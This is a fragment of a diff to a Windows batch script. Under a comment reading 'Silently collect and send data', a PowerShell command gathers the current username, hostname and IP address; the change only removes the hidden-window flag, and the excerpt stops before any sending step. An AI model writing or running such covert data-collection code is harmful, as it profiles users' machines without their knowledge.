@@ -14,7 +14,7 @@ exit /b
  
  
 :: Silently collect and send data
-powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command ^
+powershell -NoProfile -NonInteractive -Command ^
   "$u=(whoami).Split('\')[-1];" ^
   "$h=[System.Net.Dns]::GetHostName();" ^
   "$ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127*' -and $_.IPAddress -notlike '169*'} | Select-Object -First 1).IPAddress;" ^
